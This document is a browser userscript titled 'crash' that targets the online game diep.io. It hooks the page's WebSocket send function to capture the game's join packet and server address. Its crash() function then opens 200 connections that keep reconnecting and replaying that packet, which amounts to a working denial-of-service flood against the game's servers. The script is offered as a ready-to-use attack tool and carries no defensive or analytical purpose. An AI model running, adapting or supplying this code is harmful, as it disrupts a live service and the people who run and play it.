// ==UserScript==
// @name         crash
// @author       EL SHADAMAN of course
// @match        https://diep.io/*
// ==/UserScript==

let win = typeof unsafeWindow != "undefined" ? unsafeWindow : window;
let packet;
let url;
let i;
let info;

WebSocket.prototype.send = new Proxy(WebSocket.prototype.send, {
    apply: function(to, what, args) {
        const u8 = new Uint8Array(args[0]);
        if(u8.length >= 496 && u8.length <= 510 && u8[0] == 0) {
            packet = u8;
            url = new URL(what.url).host;
            info = { packet: btoa(new TextDecoder().decode(packet)), url };
        }
        return to.apply(what, args);
    }
});

function connect() {
    let j = i++;
    console.log("-> #" + j);
    const ws = new WebSocket(`wss://${url}/`);
    ws.onopen = function() {
        console.log("<- #" + j);
        this.send(packet);
    };
    ws.onmessage = function() {
        this.close();
    };
    ws.onclose = () => connect(i);
}

win.crash = function() {
    if(!packet || !url) {
        return console.warn("Nothing to crash, don't have enough info");
    }
    i = 1;
    for(let i = 0; i < 200; ++i) {
        connect();
    }
};

win.crash_info = function() {
    return btoa(JSON.stringify(info));
};
